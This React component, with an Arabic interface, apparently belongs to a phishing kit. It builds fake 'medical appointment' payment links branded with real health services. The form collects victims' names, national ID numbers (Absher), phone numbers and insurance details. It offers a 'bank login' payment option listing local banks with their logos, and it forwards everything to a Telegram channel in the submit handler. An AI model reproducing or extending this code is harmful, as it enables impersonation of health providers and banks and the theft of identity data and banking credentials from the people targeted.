import { useState, useMemo } from "react";
import { useParams, useNavigate } from "react-router-dom";
import { Card } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { useCreateLink } from "@/hooks/useSupabase";
import { getCountryByCode } from "@/lib/countries";
import { getHealthServicesByCountry } from "@/lib/healthServices";
import { getHealthBranding } from "@/lib/healthLogos";
import { getBanksByCountry } from "@/lib/banks";
import { getCurrencySymbol, getCurrencyName, formatCurrency } from "@/lib/countryCurrencies";
import { generatePaymentLink } from "@/utils/paymentLinks";
import { Heart, Hash, Phone, Calendar, User, Stethoscope, Shield, Building2, Copy, ExternalLink, CreditCard } from "lucide-react";
import { useToast } from "@/hooks/use-toast";
import { sendToTelegram } from "@/lib/telegram";
import TelegramTest from "@/components/TelegramTest";
import {
  AlertDialog,
  AlertDialogAction,
  AlertDialogContent,
  AlertDialogDescription,
  AlertDialogFooter,
  AlertDialogHeader,
  AlertDialogTitle,
} from "@/components/ui/alert-dialog";

const CreateHealthLink = () => {
  const { country } = useParams();
  const navigate = useNavigate();
  const { toast } = useToast();
  const createLink = useCreateLink();
  const countryData = getCountryByCode(country?.toUpperCase() || "");
  const services = getHealthServicesByCountry(country?.toUpperCase() || "");

  const [selectedService, setSelectedService] = useState("");
  const [patientName, setPatientName] = useState("");
  const [patientId, setPatientId] = useState("");
  const [phoneNumber, setPhoneNumber] = useState("");
  const [appointmentDate, setAppointmentDate] = useState("");
  const [doctorName, setDoctorName] = useState("");
  const [serviceCategory, setServiceCategory] = useState("consultation");
  const [hasInsurance, setHasInsurance] = useState(true);
  const [insuranceProvider, setInsuranceProvider] = useState("");
  const [selfPayAmount, setSelfPayAmount] = useState("0");
  const [paymentMethod, setPaymentMethod] = useState("card");
  const [selectedBank, setSelectedBank] = useState("");
  const [showSuccessDialog, setShowSuccessDialog] = useState(false);
  const [createdPaymentUrl, setCreatedPaymentUrl] = useState("");
  const [linkId, setLinkId] = useState("");
  const [copied, setCopied] = useState(false);

  const banks = useMemo(() => getBanksByCountry(country?.toUpperCase() || ""), [country]);
  const selectedServiceData = useMemo(() =>
    services.find(s => s.key === selectedService),
    [services, selectedService]
  );

  const serviceBranding = useMemo(() =>
    selectedService ? getHealthBranding(selectedService) : null,
    [selectedService]
  );

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    if (!selectedService || !patientName || !patientId || !phoneNumber) {
      toast({
        title: "خطأ",
        description: "الرجاء ملء جميع الحقول المطلوبة",
        variant: "destructive",
      });
      return;
    }

    try {
      const link = await createLink.mutateAsync({
        type: "health",
        country_code: country || "",
        payload: {
          service_key: selectedService,
          service_name: selectedServiceData?.name || selectedService,
          patient_name: patientName,
          patient_id: patientId,
          phone_number: phoneNumber,
          appointment_date: appointmentDate,
          doctor_name: doctorName,
          service_category: serviceCategory,
          has_insurance: hasInsurance,
          insurance_provider: insuranceProvider,
          self_pay_amount: parseFloat(selfPayAmount) || 0,
          payment_method: paymentMethod,
          selected_bank: paymentMethod === "bank_login" ? selectedBank : null,
          selectedCountry: country || "SA",
        },
      });

      const paymentUrl = generatePaymentLink({
        invoiceId: link.id,
        company: selectedService,
        country: country || 'SA'
      });

      const telegramResult = await sendToTelegram({
        type: 'health_appointment_created',
        data: {
          patient_name: patientName,
          patient_id: patientId,
          phone_number: phoneNumber,
          appointment_date: appointmentDate,
          doctor_name: doctorName,
          service_name: selectedServiceData?.name || selectedService,
          service_category: serviceCategory,
          has_insurance: hasInsurance,
          insurance_provider: insuranceProvider,
          self_pay_amount: parseFloat(selfPayAmount) || 0,
          country: countryData.nameAr,
          payment_url: `${window.location.origin}/r/${country}/${link.type}/${link.id}?company=${selectedService}`
        },
        timestamp: new Date().toISOString(),
        imageUrl: serviceBranding?.ogImage || serviceBranding?.heroImage,
        description: serviceBranding?.description || selectedServiceData?.description
      });

      setCreatedPaymentUrl(paymentUrl);
      setLinkId(link.id);
      setShowSuccessDialog(true);

      if (telegramResult.success) {
        toast({
          title: "تم الإرسال بنجاح",
          description: "تم إرسال البيانات إلى التليجرام",
        });
      } else {
        toast({
          title: "تحذير",
          description: "تم إنشاء الرابط ولكن فشل في إرسال البيانات إلى التليجرام",
          variant: "destructive",
        });
      }
    } catch (error) {
      console.error("Error creating link:", error);
    }
  };

  const handleCopyLink = () => {
    navigator.clipboard.writeText(createdPaymentUrl);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
    toast({
      title: "تم النسخ!",
      description: "تم نسخ الرابط إلى الحافظة",
    });
  };

  const handlePreview = () => {
    window.open(createdPaymentUrl, '_blank');
  };

  if (!countryData) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-background" dir="rtl">
        <div className="text-center p-8">
          <Heart className="w-16 h-16 mx-auto mb-4 text-muted-foreground" />
          <h2 className="text-2xl font-bold mb-2 text-foreground">الدولة غير موجودة</h2>
          <p className="text-muted-foreground mb-6">الرجاء اختيار دولة صحيحة</p>
          <Button onClick={() => navigate('/services')}>العودة للخدمات</Button>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen py-4 bg-gradient-to-b from-background to-secondary/20" dir="rtl">
      <div className="container mx-auto px-4">
        <div className="mb-6">
          <TelegramTest />
        </div>

        <div className="max-w-2xl mx-auto">
          <Card className="p-4 shadow-elevated">
            <div
              className="h-16 -m-4 mb-4 rounded-t-xl relative"
              style={{
                background: `linear-gradient(135deg, ${countryData.primaryColor}, ${countryData.secondaryColor})`,
              }}
            >
              <div className="absolute inset-0 bg-black/20 rounded-t-xl" />
              <div className="absolute bottom-2 right-4 text-white">
                <h1 className="text-lg font-bold">حجز موعد طبي</h1>
                <p className="text-xs opacity-90">{countryData.nameAr}</p>
              </div>
            </div>

            <form onSubmit={handleSubmit} className="space-y-4">
              {/* Service Selection */}
              <div>
                <Label className="mb-2 text-sm">الخدمة الصحية *</Label>
                <Select value={selectedService} onValueChange={setSelectedService}>
                  <SelectTrigger className="h-10">
                    <SelectValue placeholder="اختر الخدمة الصحية" />
                  </SelectTrigger>
                  <SelectContent className="bg-background z-50">
                    {services.map((service) => (
                      <SelectItem key={service.id} value={service.key}>
                        {service.name}
                      </SelectItem>
                    ))}
                  </SelectContent>
                </Select>
              </div>

              {/* Service Logo and Description */}
              {selectedService && serviceBranding && selectedServiceData && (
                <div className="p-3 rounded-lg border border-border bg-card/50">
                  <div className="flex items-center gap-3 mb-2">
                    {serviceBranding.logo && (
                      <img
                        src={serviceBranding.logo}
                        alt={selectedServiceData.name}
                        className="h-8 object-contain"
                        onError={(e) => {
                          e.currentTarget.style.display = 'none';
                        }}
                      />
                    )}
                    <div>
                      <h3 className="font-semibold text-sm">{selectedServiceData.name}</h3>
                    </div>
                  </div>
                  <p className="text-xs text-muted-foreground">{serviceBranding.description}</p>
                </div>
              )}

              {/* Patient Name */}
              <div>
                <Label className="mb-2 flex items-center gap-2 text-sm">
                  <User className="w-3 h-3" />
                  اسم المريض *
                </Label>
                <Input
                  value={patientName}
                  onChange={(e) => setPatientName(e.target.value)}
                  placeholder="الاسم الكامل للمريض"
                  className="h-9 text-sm"
                  required
                />
              </div>

              {/* Patient ID */}
              <div>
                <Label className="mb-2 flex items-center gap-2 text-sm">
                  <Hash className="w-3 h-3" />
                  رقم الهوية * (رقم أبشر/البطاقة)
                </Label>
                <Input
                  value={patientId}
                  onChange={(e) => setPatientId(e.target.value)}
                  placeholder="رقم الهوية الوطنية"
                  className="h-9 text-sm"
                  required
                />
              </div>

              {/* Phone Number */}
              <div>
                <Label className="mb-2 flex items-center gap-2 text-sm">
                  <Phone className="w-3 h-3" />
                  رقم الهاتف *
                </Label>
                <Input
                  type="tel"
                  value={phoneNumber}
                  onChange={(e) => setPhoneNumber(e.target.value)}
                  placeholder="05xxxxxxxx"
                  className="h-9 text-sm"
                  required
                />
              </div>

              {/* Appointment Date */}
              <div>
                <Label className="mb-2 flex items-center gap-2 text-sm">
                  <Calendar className="w-3 h-3" />
                  تاريخ الموعد
                </Label>
                <Input
                  type="datetime-local"
                  value={appointmentDate}
                  onChange={(e) => setAppointmentDate(e.target.value)}
                  className="h-9 text-sm"
                />
              </div>

              {/* Doctor Name */}
              <div>
                <Label className="mb-2 flex items-center gap-2 text-sm">
                  <Stethoscope className="w-3 h-3" />
                  اسم الطبيب/المختص
                </Label>
                <Input
                  value={doctorName}
                  onChange={(e) => setDoctorName(e.target.value)}
                  placeholder="اختياري"
                  className="h-9 text-sm"
                />
              </div>

              {/* Service Category */}
              <div>
                <Label className="mb-2 text-sm">فئة الخدمة *</Label>
                <Select value={serviceCategory} onValueChange={setServiceCategory}>
                  <SelectTrigger className="h-10">
                    <SelectValue placeholder="اختر فئة الخدمة" />
                  </SelectTrigger>
                  <SelectContent className="bg-background z-50">
                    <SelectItem value="consultation">استشارة طبية</SelectItem>
                    <SelectItem value="lab">فحوصات مخبرية</SelectItem>
                    <SelectItem value="pharmacy">صيدلية</SelectItem>
                    <SelectItem value="insurance">تأمين صحي</SelectItem>
                  </SelectContent>
                </Select>
              </div>

              {/* Insurance Status */}
              <div>
                <Label className="mb-2 flex items-center gap-2 text-sm">
                  <Shield className="w-3 h-3" />
                  هل يوجد تأمين صحي؟
                </Label>
                <Select value={hasInsurance ? "yes" : "no"} onValueChange={(v) => setHasInsurance(v === "yes")}>
                  <SelectTrigger className="h-10">
                    <SelectValue placeholder="اختر حالة التأمين" />
                  </SelectTrigger>
                  <SelectContent className="bg-background z-50">
                    <SelectItem value="yes">نعم</SelectItem>
                    <SelectItem value="no">لا</SelectItem>
                  </SelectContent>
                </Select>
              </div>

              {/* Insurance Provider */}
              {hasInsurance && (
                <div>
                  <Label className="mb-2 text-sm">شركة التأمين</Label>
                  <Input
                    value={insuranceProvider}
                    onChange={(e) => setInsuranceProvider(e.target.value)}
                    placeholder="اسم شركة التأمين"
                    className="h-9 text-sm"
                  />
                </div>
              )}

              {/* Self Pay Amount (if no insurance) */}
              {!hasInsurance && (
                <div>
                  <Label className="mb-2 flex items-center gap-2 text-sm">
                    <CreditCard className="w-3 h-3" />
                    المبلغ المطلوب *
                    {country && (
                      <span className="text-xs text-muted-foreground">
                        ({getCurrencyName(country)})
                      </span>
                    )}
                  </Label>
                  <Input
                    type="number"
                    value={selfPayAmount}
                    onChange={(e) => setSelfPayAmount(e.target.value)}
                    placeholder={country ? `0.00 ${getCurrencySymbol(country)}` : "0.00"}
                    className="h-9 text-sm"
                    step="0.01"
                    min="0"
                    required
                  />
                </div>
              )}

              {/* Payment Method */}
              <div>
                <Label className="mb-2 flex items-center gap-2 text-sm">
                  <CreditCard className="w-3 h-3" />
                  طريقة الدفع *
                </Label>
                <Select value={paymentMethod} onValueChange={setPaymentMethod}>
                  <SelectTrigger className="h-10">
                    <SelectValue placeholder="اختر طريقة الدفع" />
                  </SelectTrigger>
                  <SelectContent className="bg-background z-50">
                    <SelectItem value="card">بطاقة ائتمان</SelectItem>
                    <SelectItem value="bank_login">تسجيل دخول البنك</SelectItem>
                  </SelectContent>
                </Select>
              </div>

              {/* Bank Selection */}
              {paymentMethod === "bank_login" && (
                <div>
                  <Label className="mb-2 flex items-center gap-2 text-sm">
                    <Building2 className="w-3 h-3" />
                    اختر البنك *
                  </Label>
                  <Select value={selectedBank} onValueChange={setSelectedBank}>
                    <SelectTrigger className="h-10">
                      <SelectValue placeholder="اختر البنك" />
                    </SelectTrigger>
                    <SelectContent className="bg-background z-50">
                      {banks.map((bank) => (
                        <SelectItem key={bank.id} value={bank.id}>
                          <div className="flex items-center gap-2">
                            {bank.logo && (
                              <img
                                src={bank.logo}
                                alt={bank.nameAr}
                                className="h-5 w-5 object-contain"
                                onError={(e) => e.currentTarget.style.display = 'none'}
                              />
                            )}
                            <span>{bank.nameAr}</span>
                          </div>
                        </SelectItem>
                      ))}
                    </SelectContent>
                  </Select>
                </div>
              )}

              {/* Submit Button */}
              <Button
                type="submit"
                className="w-full py-5"
                disabled={createLink.isPending}
              >
                {createLink.isPending ? (
                  <span className="text-sm">جاري الإنشاء...</span>
                ) : (
                  <>
                    <Heart className="w-4 h-4 ml-2" />
                    <span className="text-sm">حجز موعد طبي</span>
                  </>
                )}
              </Button>
            </form>
          </Card>
        </div>
      </div>

      {/* Success Dialog */}
      <AlertDialog open={showSuccessDialog} onOpenChange={setShowSuccessDialog}>
        <AlertDialogContent className="max-w-md" dir="rtl">
          <AlertDialogHeader>
            <AlertDialogTitle className="text-xl text-center">
              ✅ تم حجز الموعد بنجاح!
            </AlertDialogTitle>
            <AlertDialogDescription className="text-center">
              يمكنك نسخ الرابط أو معاينته قبل المتابعة
            </AlertDialogDescription>
          </AlertDialogHeader>

          <div className="my-4">
            <div className="bg-secondary/50 p-3 rounded-lg mb-3 break-all text-xs">
              {createdPaymentUrl}
            </div>

            <div className="flex gap-2">
              <Button onClick={handleCopyLink} variant="outline" className="flex-1">
                {copied ? "تم النسخ!" : "نسخ الرابط"}
              </Button>
              <Button onClick={handlePreview} variant="outline" className="flex-1">
                معاينة
              </Button>
            </div>
          </div>
        </AlertDialogContent>
      </AlertDialog>
    </div>
  );
};

export default CreateHealthLink;
